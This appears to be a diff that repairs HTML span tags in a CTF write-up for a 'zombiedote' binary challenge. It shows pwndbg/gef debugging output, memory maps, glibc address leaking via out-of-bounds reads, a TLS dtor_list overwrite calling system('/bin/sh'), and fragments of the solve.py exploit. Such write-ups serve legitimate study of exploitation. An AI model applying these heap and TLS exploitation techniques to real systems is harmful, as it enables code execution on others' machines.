@@ -193,7 +193,7 @@ warning: Unable to find libthread_db matching inferior's thread library, thread 
 <span class="code-white">[5] Inspect log</span>
 <span class="code-white">&gt;&gt; 2</span>
 
-<span class="code-white">Breakpoint 1, <span class="code-blue">0x0000561b1384a59b</span> in <span class="code-dark-yellow">insert</span> ()
+<span class="code-white">Breakpoint 1, <span class="code-blue">0x0000561b1384a59b</span> in <span class="code-dark-yellow">insert</span> ()</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x $rdi
 $1 = 0x7ffd8d22cfe0
 <span class="code-red">pwndbg&gt; </span>x/4gx $rdi
@@ -231,7 +231,7 @@ LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blu
 <span class="code-dark-yellow">    0x7ffd8d20e000     0x7ffd8d22f000 rw-p    21000      0 [stack]</span>
     0x7ffd8d29f000     0x7ffd8d2a3000 r--p     4000      0 [vvar]
 <span class="code-dark-red">    0x7ffd8d2a3000     0x7ffd8d2a5000 r-xp     2000      0 [vdso]</span>
-<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span>
 </code></pre></div><p>I have used <code>17000</code> because <code>8 * 17000 = 0x21340</code>, which is greater than the heap size (<code>0x21000</code>). The <code>mmap</code> chunk is placed at the top of <code>anon_7f890cace</code>, between <code>libc.so.6</code> and <code>ld-2.34.so</code>.</p><p>Notice that the there is a guard page between the <code>mmap</code> chunk and <code>libc.so.6</code> (the space between <code>anon_7f890ca1b</code> and <code>anon_7f890cace</code> is random). However, the offset between the <code>mmap</code> chunk and <code>ld-2.34.so</code> is fixed.</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>The fact that the chunk&rsquo;s offset to <code>ld-2.34.so</code> is fixed allows us to access this address space with <code>inspect</code> and look for a Glibc pointer to bypass ASLR. If we do this, we won&rsquo;t be able to use <code>inspect</code> any more.</p><p>Here, I also considered trying to leak a stack address (in Glibc <code>environ</code>). With this, I wanted to modify the current <code>log</code> structure and have unlimited OOB read/write. But it is not possible because the offset to the stack is not fixed from the chunk&rsquo;s position, and we don&rsquo;t know where it is placed.</p><p>So, the best leak to get is a Glibc address. I found some pointers in the purple section of <code>ld-2.34.so</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/30gx 0x7f890cb2a000
 <span class="code-dark-blue">0x7f890cb2a000</span>: 0x0000000000034e70      0x0000000000000000
 <span class="code-dark-blue">0x7f890cb2a010</span>: 0x0000000000000000      0x00007f890c978140
@@ -304,7 +304,7 @@ $2 = 47108
 <span class="code-white">[3] Delete log</span>
 <span class="code-white">[4] Edit log</span>
 <span class="code-white">[5] Inspect log</span>
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>At this point, we have two OOB writes to achieve code execution. However, we only know relative offsets to <code>ld-2.34.so</code>. I found <a target="_blank" href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">this awesome list</a> of modern exploitation techniques for Glibc >= 2.34, but I couldn&rsquo;t implement any of these techniques with the current situation.</p><p>The issue is that we don&rsquo;t have a fixed offset to Glibc from the <code>mmap</code> chunk. All of the techniques require one memory space to hold a fake structure (<code>exit_handler</code>, <code>link_map</code>, <code>FILE</code>), which is possible due to <code>insert</code>. But then we need to modify some Glibc memory to point to our <code>mmap</code> chunk, and we don&rsquo;t know where we are located.</p><p>The simplest technique I found for this situation is modifying the Thread Local Storage (TLS) to insert a <code>dtor_list</code> object that points to the chunk, which holds <code>system</code> and the address of <code>"/bin/sh"</code> (more information <a target="_blank" href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">here</a>). But again, I need a pointer to the chunk!</p><p>We could consider using brute force on the <code>mmap</code> chunk address, because the guard page sizes are more or less predictable, only 12 bits change. But this would result in a 1/4096 chance of having success, so it is not quite affordable.</p><h3 id="switching-to-docker">Switching to Docker</h3><p>After a lot of research trying to find a suitable technique that could work on this situation, I tested the current exploit on the remote instance and for a sanity check and found out that the Glibc address was wrong, so I was not getting a Glibc address using the previous approach. Then, I started the Docker image provided and saw the same behavior!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.54.27:37337
 [<span class="code-blue">*</span>] './zombiedote'
     Arch:     amd64-64-little
@@ -325,7 +325,7 @@ $2 = 47108
 <span class="code-white">[3] Delete log</span>
 <span class="code-white">[4] Edit log</span>
 <span class="code-white">[5] Inspect log</span>
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><p>I investigated this issue by running GDB (using <a target="_blank" href="https://github.com/bata24/gef">bata24&rsquo;s <code>gef</code> extension</a>) inside the container (modified to have <code>root</code> access) and doing the same steps:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/tmp"</span> zombiedote sh
 # apk update
 ...
@@ -333,7 +333,7 @@ $2 = 47108
 ...
 # wget -q https://raw.githubusercontent.com/bata24/gef/dev/install.sh -O- | sh
 ...
-</span># gdb -q zombiedote
+# gdb -q zombiedote
 Reading symbols from <span class="code-dark-green">zombiedote</span>...
 (No debugging symbols found in <span class="code-dark-green">zombiedote</span>)
 <span class="code-red">gef&gt; </span>aslr on
@@ -367,7 +367,7 @@ warning: Unable to find libthread_db matching inferior's thread library, thread 
 <span class="code-white">[5] Inspect log</span>
 <span class="code-white">&gt;&gt; 2</span>
 
-<span class="code-white">Breakpoint 1.1, <span class="code-blue">0x000055f89365c59b</span> in <span class="code-dark-yellow">insert</span> ()
+<span class="code-white">Breakpoint 1.1, <span class="code-blue">0x000055f89365c59b</span> in <span class="code-dark-yellow">insert</span> ()</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x $rdi
 $1 = 0x7ffe18b283f0
 <span class="code-green">gef&gt; </span>x/4gx $rdi
@@ -384,7 +384,7 @@ $1 = 0x7ffe18b283f0
 <span class="code-blue">Start              End                Size               Offset             Perm Path</span>
 <span>0x000055f89365b000</span> <span>0x000055f89365c000</span> <span>0x0000000000001000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/zombiedote</span>
 <span class="code-dark-red">0x000055f89365c000</span> <span class="code-dark-red">0x000055f89365d000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/zombiedote</span><span class="code-blue">  &lt;-  $rip, $r13</span>
-<span>0x000055f89365d000</span> <span>0x000055f89365e000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>/home/ctf/zombiedote<span class="code-blue">  &lt;-  $rdx</span>
+<span>0x000055f89365d000</span> <span>0x000055f89365e000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>/home/ctf/zombiedote<span class="code-blue">  &lt;-  $rdx</span></span>
 <span>0x000055f89365e000</span> <span>0x000055f89365f000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>/home/ctf/zombiedote</span>
 <span class="code-dark-green">0x000055f89365f000</span> <span class="code-dark-green">0x000055f893660000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000003000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
 <span class="code-dark-green">0x000055f893660000</span> <span class="code-dark-green">0x000055f893661000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000005000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
@@ -394,7 +394,7 @@ $1 = 0x7ffe18b283f0
 <span class="code-dark-green">0x00007fe9868c7000</span> <span class="code-dark-green">0x00007fe9868ec000</span> <span class="code-dark-green">0x0000000000025000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">&lt;tls-th1&gt;</span>
 <span>0x00007fe9868ec000</span> <span>0x00007fe986918000</span> <span>0x000000000002c000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6</span>
 <span class="code-dark-red">0x00007fe986918000</span> <span class="code-dark-red">0x00007fe986aac000</span> <span class="code-dark-red">0x0000000000194000</span> <span class="code-dark-red">0x000000000002c000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/glibc/libc.so.6</span>
-<span>0x00007fe986aac000</span> <span>0x00007fe986b00000</span> <span>0x0000000000054000</span> <span>0x00000000001c0000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6<span class="code-blue">  &lt;-  $r10, $r11</span>  
+<span>0x00007fe986aac000</span> <span>0x00007fe986b00000</span> <span>0x0000000000054000</span> <span>0x00000000001c0000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6<span class="code-blue">  &lt;-  $r10, $r11</span> </span>  
 <span class="code-grey">0x00007fe986b00000</span> <span class="code-grey">0x00007fe986b01000</span> <span class="code-grey">0x0000000000001000</span> <span class="code-grey">0x0000000000214000</span> <span class="code-grey">---</span> <span class="code-grey">/home/ctf/glibc/libc.so.6</span>
 <span>0x00007fe986b01000</span> <span>0x00007fe986b04000</span> <span>0x0000000000003000</span> <span>0x0000000000214000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6</span>
 <span class="code-dark-green">0x00007fe986b04000</span> <span class="code-dark-green">0x00007fe986b07000</span> <span class="code-dark-green">0x0000000000003000</span> <span class="code-dark-green">0x0000000000217000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/glibc/libc.so.6</span>
@@ -402,7 +402,7 @@ $1 = 0x7ffe18b283f0
 <span>0x00007fe986b16000</span> <span>0x00007fe986b17000</span> <span>0x0000000000001000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so</span>
 <span class="code-dark-red">0x00007fe986b17000</span> <span class="code-dark-red">0x00007fe986b3f000</span> <span class="code-dark-red">0x0000000000028000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/glibc/ld-2.34.so</span>
 <span>0x00007fe986b3f000</span> <span>0x00007fe986b49000</span> <span>0x000000000000a000</span> <span>0x0000000000029000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so</span>
-<span>0x00007fe986b49000</span> <span>0x00007fe986b4b000</span> <span>0x0000000000002000</span> <span>0x0000000000032000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so<span class="code-blue">  &lt;-  $r15</span>
+<span>0x00007fe986b49000</span> <span>0x00007fe986b4b000</span> <span>0x0000000000002000</span> <span>0x0000000000032000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so<span class="code-blue">  &lt;-  $r15</span></span>
 <span class="code-dark-green">0x00007fe986b4b000</span> <span class="code-dark-green">0x00007fe986b4d000</span> <span class="code-dark-green">0x0000000000002000</span> <span class="code-dark-green">0x0000000000034000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/glibc/ld-2.34.so</span>
 <span class="code-dark-magenta">0x00007ffe18b09000</span> <span class="code-dark-magenta">0x00007ffe18b2a000</span> <span class="code-dark-magenta">0x0000000000021000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span><span class="code-blue">  &lt;-  $rax, $rsp, $rbp, $rdi, $r12</span>
 <span>0x00007ffe18b66000</span> <span>0x00007ffe18b6a000</span> <span>0x0000000000004000</span> <span>0x0000000000000000</span> <span>r--</span> <span>[vvar]</span>
@@ -478,7 +478,7 @@ $6 = 17644
 <span class="mtk1">    </span><span class="mtk1">mmap_chunk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">24ff0</span>
 
 <span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">17627</span><span class="mtk1">, </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">mmap_chunk</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">])</span>
-<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">17644</span><span class="mtk1">, </span><span class="mtk6">0</span>)</span>
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">17644</span><span class="mtk1">, </span><span class="mtk6">0</span>)
 
 <span class="mtk1">    </span><span class="mtk8">insert</span><span class="mtk1">([</span>
 <span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">17</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
